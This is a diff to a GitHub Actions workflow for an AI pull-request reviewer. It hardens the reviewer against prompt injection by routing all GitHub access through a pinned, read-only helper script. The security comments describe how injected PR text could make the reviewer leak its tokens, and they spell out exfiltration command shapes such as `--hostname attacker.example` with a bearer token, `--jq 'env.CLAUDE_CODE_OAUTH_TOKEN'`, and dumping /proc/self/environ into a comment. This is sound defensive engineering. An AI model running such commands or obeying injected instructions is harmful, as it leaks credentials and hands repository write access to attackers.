@@ -25,6 +25,37 @@ name: claude-code-review
 # message. To review a contributor's fork PR, @claude it (handled by claude.yml) or
 # run `/code-review <pr>` locally.
 #
+# PROMPT-INJECTION CONTAINMENT (DOR-464). The reviewer reads PR-authored text on
+# every run — the diff, commit messages, existing comments — so treat everything
+# it does as attacker-influenced. It therefore holds NO `gh` grant of its own:
+# all of its GitHub access goes through scripts/review-gh.sh, materialized from
+# the default branch (see "Materialize the trusted review helper"), which pins the
+# host, the repo and the PR number and takes only content as arguments. That is
+# strictly stronger than any allow-list pattern, because the Bash matcher is a
+# prefix match: it cannot forbid a trailing `--repo attacker.example/a/b`,
+# `--hostname attacker.example`, `-H "Authorization: Bearer $GH_TOKEN"` or
+# `--jq 'env.CLAUDE_CODE_OAUTH_TOKEN'`, and only an exact match would try. What
+# this closed: `Bash(grep:*)` + `Bash(gh pr comment:*)` — dump /proc/self/environ,
+# post it — plus the quieter variants where `gh pr diff --repo HOST/OWNER/REPO`
+# reaches any host at all and `gh pr view --jq env.X` reads the environment
+# without grep. Either shape leaks CLAUDE_CODE_OAUTH_TOKEN and the OIDC App token,
+# which carries contents, pull_requests and issues WRITE.
+#
+# RESIDUAL RISK, accepted deliberately. Two things survive the above:
+#   1. The reviewer can still write anything into a comment BODY, and `$VAR`
+#      expansion means it can put a secret there without reading one first.
+#      Pinning the destination does not change that; it changes where the secret
+#      lands. A comment on this repo's own PR is loud and auditable — it is
+#      visible to every watcher, it notifies, and it stays in the comment history.
+#      Silent egress to a host of the model's choosing is what is gone. Anyone
+#      rotating a token leaked this way should assume the comment was read.
+#   2. `Bash(git log:*)` and `Bash(git show:*)` accept `--output=<file>`, which
+#      writes an arbitrary local path with arbitrary content (a PR-authored commit
+#      message is arbitrary content). They are kept because REVIEW.md has the
+#      reviewer trace history. The helper and its directory are therefore mode
+#      0500, so that primitive cannot rewrite the sink or drop a sibling beside
+#      it — without which the allow-list entry would point at a PR-authored file.
+#
 # KNOWN BLIND SPOT — a PR with merge conflicts gets NO review, and no red check
 # either (DOR-457). GitHub builds the test-merge ref (`refs/pull/N/merge`) before
 # it creates a `pull_request` workflow run; when the PR conflicts with its base
@@ -52,9 +83,10 @@ name: claude-code-review
 # treats workflow_dispatch as an *automation* context with no PR identity, which
 # switches off two things it does for us on `pull_request`, so this file supplies
 # both: the PR head's agent config is reverted by a step here ("Revert PR-authored
-# agent config"), and line-level findings are posted through `gh api` because the
-# inline-comment tool is not registered (see "Claude Code review"). Keep that in
-# mind before assuming a dispatch run behaves identically.
+# agent config"), and line-level findings are posted through the review helper's
+# `inline` subcommand because the inline-comment tool is not registered (see
+# "Claude Code review"). Keep that in mind before assuming a dispatch run behaves
+# identically.
 
 on:
   # On-demand, not on every push: no `synchronize`. A full review fires on open
@@ -228,9 +260,11 @@ jobs:
       # This repo supplies the trigger. Its own `.claude/settings.json` defines a
       # PreToolUse hook on `Bash` that runs `node .claude/hooks/file-guard.mjs`, and
       # both it and the hook scripts are tracked and PR-editable. The reviewer's
-      # first act is `gh pr diff` — a Bash call — so a PR-authored hook would
+      # first act is reading the diff — a Bash call — so a PR-authored hook would
       # execute as a shell command inside a job holding CLAUDE_CODE_OAUTH_TOKEN and
-      # an OIDC-minted App token with write scopes.
+      # an OIDC-minted App token with write scopes. Note this sits UPSTREAM of the
+      # allow-list: a PreToolUse hook runs before tool gating, so routing the
+      # reviewer's GitHub access through a fixed-shape helper does not cover it.
       #
       # The trust boundary, stated plainly: reaching this needs push access,
       # because only a same-repo PR gets past "Resolve target PR". This is not a
@@ -309,6 +343,69 @@ jobs:
             echo "Deleted (PR-added, absent on origin/$DEFAULT_BRANCH):$deleted"
           fi
 
+      # SECURITY (DOR-464) — this is the step that makes the reviewer's only
+      # GitHub access trustworthy. scripts/review-gh.sh carries the why; see also
+      # PROMPT-INJECTION CONTAINMENT in the header.
+      #
+      # Materialized from the DEFAULT BRANCH, exactly like the failure classifier
+      # below and for exactly the same reason: on BOTH triggers the checkout is
+      # PR-authored (the merge ref on `pull_request`, `refs/pull/N/head` on
+      # dispatch), `scripts/` is in neither the action's SENSITIVE_PATHS nor the
+      # revert step's path list, and a helper the PR can rewrite is not a helper —
+      # the attacker just rewrites it and keeps the destination it wanted. That
+      # exact mistake was made once in this file's history (the classifier was run
+      # from the checkout, review round 3, finding 1) and this is the shape that
+      # fixed it: `git show <ref>:<path>` reads the object database, so nothing the
+      # PR does to the worktree — including deleting the script — can reach it.
+      #
+      # Then locked down, because two grants the reviewer keeps are write
+      # primitives: `git log --output=<file>` and `git show --output=<file>` write
+      # an arbitrary path, and a PR-authored commit message is arbitrary content.
+      # Mode 0500 on the file stops either overwriting the helper; 0500 on the
+      # directory stops either dropping a sibling next to it, which is the other
+      # way to satisfy a prefix match (the matcher refuses that extension too; this
+      # is the second layer, not the only one). Verified locally: `git log
+      # --output=` onto a 0500 file fails with "could not open ... for writing:
+      # Permission denied". Nothing later in the job writes into this directory, and
+      # ubuntu-latest runners are ephemeral, so it needs no teardown.
+      - name: Materialize the trusted review helper
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ steps.target.outputs.number }}
+          REPO: ${{ github.repository }}
+          HELPER_DIR: ${{ runner.temp }}/trusted
+        run: |
+          # Fail LOUD, not merely closed. Exiting here skips "Claude Code review",
+          # so "Note infra failure" never fires either (it keys off that step's
+          # outcome) — which would leave exactly the silent red check the rest of
+          # this file exists to prevent. Say it on the PR first, then exit.
+          refuse() {
+            echo "::error::$1"
+            gh pr comment "$PR_NUMBER" --repo "$REPO" --body \
+              "This check is red because the review could not start: $1 Nothing in this PR was looked at, and this is not a finding about your code. Add the \`re-review\` label to try again." || true
+            exit 1
+          }
+
+          if [ -z "$DEFAULT_BRANCH" ]; then
+            refuse "the default branch could not be resolved, so the reviewer's GitHub helper would have had to come from this PR's own checkout."
+          fi
+
+          # `fetch-depth: 0` on the checkout above normally leaves the default
+          # branch here already; fetch only if it is missing, and never shallow
+          # (see the revert step for what shallowing costs the review).
+          if ! git rev-parse --verify --quiet "refs/remotes/origin/$DEFAULT_BRANCH" >/dev/null; then
+            git fetch --no-recurse-submodules --no-tags origin \
+              "+refs/heads/$DEFAULT_BRANCH:refs/remotes/origin/$DEFAULT_BRANCH" || true
+          fi
+
+          mkdir -p "$HELPER_DIR"
+          if ! git show "origin/$DEFAULT_BRANCH:scripts/review-gh.sh" >"$HELPER_DIR/review-gh.sh"; then
+            refuse "the reviewer's GitHub helper could not be read from the $DEFAULT_BRANCH branch, and running this PR's copy of it is not an option."
+          fi
+          chmod 0500 "$HELPER_DIR/review-gh.sh"
+          chmod 0500 "$HELPER_DIR"
+          echo "Materialized scripts/review-gh.sh from origin/$DEFAULT_BRANCH (read-only)"
+
       # Timestamp cutoff for the infra-failure step below, so it only looks at
       # comments this run could plausibly have posted (not leftovers from an
       # earlier review or re-review pass on the same PR).
@@ -341,6 +438,14 @@ jobs:
       - name: Claude Code review
         id: claude-review
         uses: anthropics/claude-code-action@v1
+        env:
+          # The reviewer's destination, read by scripts/review-gh.sh. It lives in
+          # the environment rather than in the helper's arguments precisely so the
+          # model cannot supply it: step `env:` reaches the CLI's shell because the
+          # action spawns it as a child process, and the Bash matcher refuses the
+          # `VAR=x cmd` prefix that would let a tool call override it.
+          REVIEW_REPO: ${{ github.repository }}
+          REVIEW_PR: ${{ steps.target.outputs.number }}
         with:
           claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
           # Plain-prompt review following Anthropic's "Automatic PR Code Review"
@@ -351,9 +456,26 @@ jobs:
           prompt: |
             REPO: ${{ github.repository }}
             PR NUMBER: ${{ steps.target.outputs.number }}
-            INLINE COMMENTS: ${{ github.event_name == 'workflow_dispatch' && 'gh api' || 'inline-comment tool' }}
+            INLINE COMMENTS: ${{ github.event_name == 'workflow_dispatch' && 'review-gh.sh inline' || 'inline-comment tool' }}
 
             You are reviewing this pull request as a senior DorkOS engineer.
+
+            You have no `gh` command. Every GitHub call goes through one helper,
+            which already knows this repo and this PR, so you never pass either:
+
+              bash ${{ runner.temp }}/trusted/review-gh.sh diff
+              bash ${{ runner.temp }}/trusted/review-gh.sh view <jsonFields>
+              bash ${{ runner.temp }}/trusted/review-gh.sh summary '<body>'
+              bash ${{ runner.temp }}/trusted/review-gh.sh inline <file> <line> '<body>'
+
+            `view` takes comma-separated JSON field names, e.g. `view labels`,
+            `view comments` or `view files` for the changed-file list, and prints
+            raw JSON for you to read — it takes no jq expression, and `diff` takes
+            no flags. Nothing else about these commands is negotiable: extra
+            flags, a different path, or `gh` on its own will all be refused. Below,
+            `review-gh.sh <args>` is shorthand for one of the four lines above —
+            type the full command. To search, use Grep or `git grep`; bare `grep`
+            and `rg` are not available either.
 
             First, read REVIEW.md and AGENTS.md at the repository root and apply
             them in full, including REVIEW.md's "How to review" process, the
@@ -364,14 +486,14 @@ jobs:
             bar.
 
             Set the review scope before you start, from the PR labels
-            (`gh pr view --json labels`):
+            (`review-gh.sh view labels`):
             - `review:light` present: quick pass only. Post only 🔴 Important
               findings; skip nits and the deletion sweep.
             - `review:deep` present: be exhaustive. Trace every caller and run the
               full dangling-reference sweep.
             - otherwise: the standard review.
             Then check whether you have already reviewed this PR (look for your own
-            prior summary comment via `gh pr view --json comments`). If you have,
+            prior summary comment via `review-gh.sh view comments`). If you have,
             this is a RE-REVIEW: read your prior findings, treat addressed or
             resolved ones as done, review only what changed since your last pass,
             and post only NEW or still-unaddressed 🔴 Important findings. Do not
@@ -379,22 +501,21 @@ jobs:
 
             The code under review is already checked out: on an automatic run that
             is the PR's test-merge ref (the PR merged into its base), and on a manual
-            dispatch it is the PR's head. Use `gh pr diff <PR NUMBER>` for the
-            changes — always pass the number, because the checkout is a detached
-            HEAD and an argument-less `gh pr diff` cannot infer the PR — and read the
-            surrounding files for context. One exception: `.claude/`, `.mcp.json`,
-            `CLAUDE.md` and `.husky` on disk are reverted to a trusted branch's
-            versions, not this PR's, because a PR must not be able to make its own
-            reviewer execute hooks the PR wrote. Judge changes to those paths from
-            the diff, never from disk. Work outward from the diff: for every
-            symbol the PR changes, removes, or renames, grep the repo for its callers
-            and references before judging the change safe. For any PR that DELETES or
-            RENAMES files, paths, exports, commands, hooks, or config keys, run the
-            dangling-reference sweep (grep the whole tree for every removed
-            identifier, in prose and config too) before concluding it is clean.
+            dispatch it is the PR's head. Use `review-gh.sh diff` for the changes and
+            read the surrounding files for context. One exception: `.claude/`,
+            `.mcp.json`, `CLAUDE.md` and `.husky` on disk are reverted to a trusted
+            branch's versions, not this PR's, because a PR must not be able to make
+            its own reviewer execute hooks the PR wrote. Judge changes to those paths
+            from the diff, never from disk. Work outward from the diff: for every
+            symbol the PR changes, removes, or renames, search the repo for its
+            callers and references before judging the change safe. For any PR that
+            DELETES or RENAMES files, paths, exports, commands, hooks, or config
+            keys, run the dangling-reference sweep (search the whole tree for every
+            removed identifier, in prose and config too) before concluding it is
+            clean.
 
-            Verify each finding against the actual file (grep or Read) before
-            posting; drop anything you cannot cite with a `file:line`. A false
+            Verify each finding against the actual file (Grep, `git grep` or Read)
+            before posting; drop anything you cannot cite with a `file:line`. A false
             Important costs the author a round trip.
 
             Post each finding on the line it applies to. INLINE COMMENTS at the top
@@ -403,19 +524,21 @@ jobs:
             - `inline-comment tool`: use
               `mcp__github_inline_comment__create_inline_comment` (with
               `confirmed: true`).
-            - `gh api`: that tool is NOT available on this run (the action registers
-              it only for PR events, not manual dispatch). Do not try it. Read the
-              head SHA once with
-              `gh pr view <PR NUMBER> --json headRefOid --jq .headRefOid`, then post
-              each finding with exactly this command shape — the leading words must
-              match character for character or the call is refused:
-              `gh api --method POST repos/<REPO>/pulls/<PR NUMBER>/comments -f body='<finding>' -f commit_id=<sha> -f path=<file> -F line=<n> -f side=RIGHT`
-              If two such calls in a row are refused or error, stop retrying and
-              fold every remaining finding into the summary comment instead, each
-              one prefixed with `file:line`, so nothing is silently dropped.
+            - `review-gh.sh inline`: that tool is NOT available on this run (the
+              action registers it only for PR events, not manual dispatch). Do not
+              try it. Post each finding with
+              `bash ${{ runner.temp }}/trusted/review-gh.sh inline <file> <line> '<finding>'`
+              instead. It resolves the head commit itself, so there is no SHA to
+              look up first.
+
+            The helper's `inline` works on either trigger, so if the tool above is
+            refused or errors twice in a row, switch to it rather than retrying.
+            Should that fail too, stop and fold every remaining finding into the
+            summary comment, each one prefixed with `file:line`, so nothing is
+            silently dropped.
 
             Then post a one-line severity tally (e.g. "1 important, 3 nits") as a
-            top-level summary with `gh pr comment`.
+            top-level summary with `review-gh.sh summary`.
             Only post GitHub comments; do not submit the review as a chat message.
             If there are no blocking issues, post a brief "No blocking issues
             found" summary comment.
@@ -445,40 +568,40 @@ jobs:
           # the reviewer's permissions come from --allowedTools instead — but it is a
           # real narrowing of protection, not a free one.
           #
-          # The second --allowedTools line (dispatch only) is finding 3 of the
-          # DOR-457 review: the action registers the github_inline_comment MCP
-          # server only for PR entity events (src/mcp/install-mcp-server.ts), the
-          # same gate as the config restore, so on dispatch that tool does not
-          # exist. Without a fallback the hatch silently degrades to summary-only
-          # and drops every line-level finding — while still posting a summary, so
-          # the loss is invisible.
+          # THE ALLOW-LIST (DOR-464). There is no `gh` in it. Every GitHub call the
+          # reviewer makes goes through the one helper materialized above, which
+          # pins host, repo and PR number and takes only content as arguments — see
+          # PROMPT-INJECTION CONTAINMENT in the header for the threat model and the
+          # residual, and scripts/review-gh.sh for the mechanics.
           #
-          # Be precise about what that grant buys, because an earlier version of this
-          # comment claimed it was "exactly the authority the MCP server would have
-          # had" and that is false. Claude Code's Bash matcher is a PREFIX match. It
-          # does refuse chaining (`&&`, `;`, newline), command substitution, pipes and
-          # redirection, and it refuses extending the endpoint path — all probed. But
-          # it ALLOWS extra flags on the same invocation, and `$VAR` expansion, so
-          # `--hostname attacker.example -H "Authorization: Bearer $GH_TOKEN"` reaches
-          # an arbitrary host with the token attached. The MCP server could not do
-          # that. Firing it needs prompt injection out of PR-authored text.
+          # Why not a narrower `gh` pattern instead: Claude Code's Bash matcher is a
+          # PREFIX match. It refuses chaining (`&&`, `;`, newline), command
+          # substitution, pipes, redirection and extending the matched path — all
+          # probed — but it ALLOWS extra flags on the same invocation, plus `$VAR`
+          # expansion. So no pattern short of an exact match can forbid
+          # `--hostname attacker.example -H "Authorization: Bearer $GH_TOKEN"`,
+          # `--repo attacker.example/a/b` (measured: `gh pr diff` and `gh pr view`
+          # connect to any host given one) or `--jq 'env.CLAUDE_CODE_OAUTH_TOKEN'`
+          # (measured: prints the process environment, no grep required). A
+          # fixed-shape helper removes the choice rather than pattern-matching it.
           #
-          # It is left in place because the identical exfil is already reachable from
-          # the always-on `Bash(grep:*)` + `Bash(gh pr comment:*)` pair (read
-          # /proc/self/environ, post it) on BOTH triggers, which predates this file's
-          # dispatch path — so tightening only this line would buy nothing while
-          # costing the inline comments the dispatch path exists to keep. Closing the
-          # class properly means taking the token out of the CLI's reach behind a
-          # fixed-shape posting helper, which is its own change, not a comment fix.
+          # `Bash(grep:*)` and `Bash(rg:*)` are gone with it. They were the
+          # `grep "" /proc/self/environ` half of the original exfil, and they were
+          # already redundant: `Grep`, `Glob` and `Read` are granted below and are
+          # confined to the workspace. `Bash(git grep:*)` stays — REVIEW.md tells
+          # the reviewer to `git grep`, and unlike bare grep it refuses paths
+          # outside the repository even with `--no-index` (verified: "is outside
+          # repository"), so it is not the same read primitive.
           #
-          # It is still deliberately NOT `Bash(gh api:*)`: the token the CLI sees is
-          # the action's OIDC-minted App token with contents/issues/pull_requests
-          # WRITE (src/github/token.ts), so a broad `gh api` grant would also let a
-          # reviewer reading PR-authored text push commits — a different and worse
-          # authority than leaking a token that already leaks.
+          # One line now, not two. The dispatch-only grant that used to sit here
+          # existed because the action registers the github_inline_comment MCP
+          # server only for PR entity events (src/mcp/install-mcp-server.ts), so on
+          # dispatch that tool does not exist and the hatch would silently degrade
+          # to summary-only, dropping every line-level finding. The helper's
+          # `inline` subcommand covers both triggers, so the fallback no longer
+          # needs a trigger-conditional grant of its own.
           claude_args: |
-            --allowedTools "mcp__github_inline_comment__create_inline_comment,Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr view:*),Bash(git grep:*),Bash(git log:*),Bash(git show:*),Bash(grep:*),Bash(rg:*),Bash(ls:*),Read,Grep,Glob"
-            ${{ github.event_name == 'workflow_dispatch' && format('--allowedTools "Bash(gh api --method POST repos/{0}/pulls/{1}/comments:*)"', github.repository, steps.target.outputs.number) || '' }}
+            --allowedTools "mcp__github_inline_comment__create_inline_comment,Bash(bash ${{ runner.temp }}/trusted/review-gh.sh:*),Bash(git grep:*),Bash(git log:*),Bash(git show:*),Bash(ls:*),Read,Grep,Glob"
             --setting-sources user
             --max-turns ${{ steps.pr-size.outputs.max_turns }}
 
